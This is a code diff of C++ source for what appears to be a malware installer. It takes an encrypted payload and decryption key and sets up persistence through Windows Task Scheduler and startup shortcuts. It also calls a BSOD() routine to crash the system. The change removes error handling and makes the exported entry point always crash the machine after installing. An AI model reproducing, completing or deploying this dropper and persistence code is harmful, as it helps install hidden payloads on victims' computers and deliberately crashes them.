@@ -130,30 +130,11 @@ void Installer::Install()
 #endif
 
 #ifdef TaskSchedulerStartup
-    HRESULT hres = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-
-    if (FAILED(hres))
-    {
-        BSOD();
-        exit(1);
-    }
-
-    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, NULL, NULL);
-
-    if (FAILED(hres))
-    {
-        BSOD();
-        exit(1);
-    }
+    CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, NULL, NULL);
 
     ITaskService* pService = NULL;
-    hres = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
-
-    if (FAILED(hres))
-    {
-        BSOD();
-        exit(1);
-    }
+    CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
 
     pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
 
@@ -243,13 +224,7 @@ void Installer::Install()
     std::wstring installPathW = converter.from_bytes(installPath);
 
 	IShellLink* psl;
-	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
-
-    if (FAILED(hres))
-    {
-        BSOD();
-        exit(1);
-    }
+	CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
 
 	IPersistFile* ppf;
 	psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
@@ -317,23 +292,11 @@ void Installer::Uninstall()
 #endif
 
 #ifdef TaskSchedulerStartup
-
-#pragma warning( push )
-#pragma warning( disable : 6031 )
-
-    /*
-        Would rather crash here with no success message to signify failed uninstall
-
-        It would be preferable to create a MessageBox; however, I can't be bothered
-        to get a valid hWnd. That is required because this module isn't registered.
-    */
     CoInitializeEx(NULL, COINIT_MULTITHREADED);
     CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, NULL, NULL);
 
     ITaskService* pService = NULL;
     CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
-
-#pragma warning( pop ) 
 
     pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
 
@@ -370,12 +333,7 @@ extern "C"
         Installer Installer(payload, dec_key);
         Installer.Install();
 
-        if (!isFirstInstance)
-        {
-            BSOD();
-            exit(1);
-        }
-        else
-            isFirstInstance = false;
+        BSOD();
+        exit(1);
     }
 }
